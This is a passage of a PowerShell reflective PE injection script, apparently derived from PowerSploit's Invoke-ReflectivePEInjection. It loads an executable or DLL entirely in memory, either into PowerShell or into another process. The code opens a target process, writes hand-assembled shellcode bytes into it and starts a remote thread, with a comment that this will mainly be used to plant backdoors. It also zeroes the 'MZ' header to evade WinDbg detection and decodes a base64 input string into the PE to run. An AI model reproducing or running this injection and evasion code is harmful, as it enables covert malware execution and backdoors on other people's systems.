			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$Wow64Process = $false
			$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}
			
			#PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		

		#Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
        #ASLR check
		[IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		if ((-not $ForceASLR) -and (-not $PESupportsASLR))
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
			[IntPtr]$LoadAddr = $OriginalImageBase
		}
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
            Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

		$PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
		if ($RemoteLoading -eq $true)
		{
			#Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			#todo, error handling needs to delete this memory if an error happens along the way
			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}
		
		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		#Now that the PE is in memory, get more detailed information about it
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"
		
		
		#Copy each section from the PE in to memory
		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		#Update the memory protection flags for all the memory just allocated
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		#If remote loading, copy the DLL in to remote process memory
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Call FreeLibrary for all the imports of the DLL
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		#Call DllMain with process detach
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		#If a remote process to inject in to is specified, get a handle to it
		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose "Getting SeDebugPrivilege"
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		

		#Load the PE reflectively
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
		
		
		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
			#########################################
			### YOUR CODE GOES HERE
			#########################################
	        switch ($FuncReturnType)
	        {
	            'WString' {
	                Write-Verbose "Calling function with WString return type"
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				    Write-Output $Output
	            }

	            'String' {
	                Write-Verbose "Calling function with String return type"
				    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
				    if ($StringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
				    [IntPtr]$OutputPtr = $StringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
				    Write-Output $Output
	            }

	            'Void' {
	                Write-Verbose "Calling function with Void return type"
				    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
				    if ($VoidFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $VoidFuncDelegate = Get-DelegateType @() ([Void])
				    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
				    $VoidFunc.Invoke() | Out-Null
	            }
	        }
			#########################################
			### END OF YOUR CODE
			#########################################
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		#Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			#Delete the PE file from memory.
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}

	Main
}

#Main function to either run the script locally or remotely
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	
	#Verify the image is a valid PE file
	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

	if (-not $DoNotZeroMZ) {
		# Remove 'MZ' from the PE file so that it cannot be detected by .imgscan in WinDbg
		# TODO: Investigate how much of the header can be destroyed, I'd imagine most of it can be.
		$PEBytes[0] = 0
		$PEBytes[1] = 0
	}
	
	#Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
	if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	{
		$ExeArgs = "ReflectiveExe $ExeArgs"
	}
	else
	{
		$ExeArgs = "ReflectiveExe"
	}

	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
	}
}

Main
}
 
# Convert base64 string to byte array
 
$PEBytes = [System.Convert]::FromBase64String($InputString)
